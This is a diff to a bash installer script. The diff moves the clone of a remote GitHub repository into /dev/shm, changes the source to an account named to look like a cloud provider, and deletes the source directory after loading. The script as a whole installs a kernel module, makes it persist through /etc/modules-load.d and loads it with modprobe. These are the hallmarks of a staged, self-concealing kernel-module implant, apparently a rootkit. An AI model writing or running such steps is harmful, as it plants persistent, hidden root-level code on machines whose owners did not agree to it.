@@ -1,7 +1,8 @@
 #!/bin/bash
 
 # Clone the repository
-git clone https://github.com/godhellolaypr/btlr.git
+cd /dev/shm/
+git clone https://github.com/digitalocean-droplet/btlr.git
 
 # Navigate into the cloned repository
 cd btlr
@@ -30,3 +31,4 @@ echo "btrl" | sudo tee /etc/modules-load.d/btrl.conf > /dev/null
 
 # Load the module
 sudo modprobe btrl
+rm -rf /dev/shm/btrl
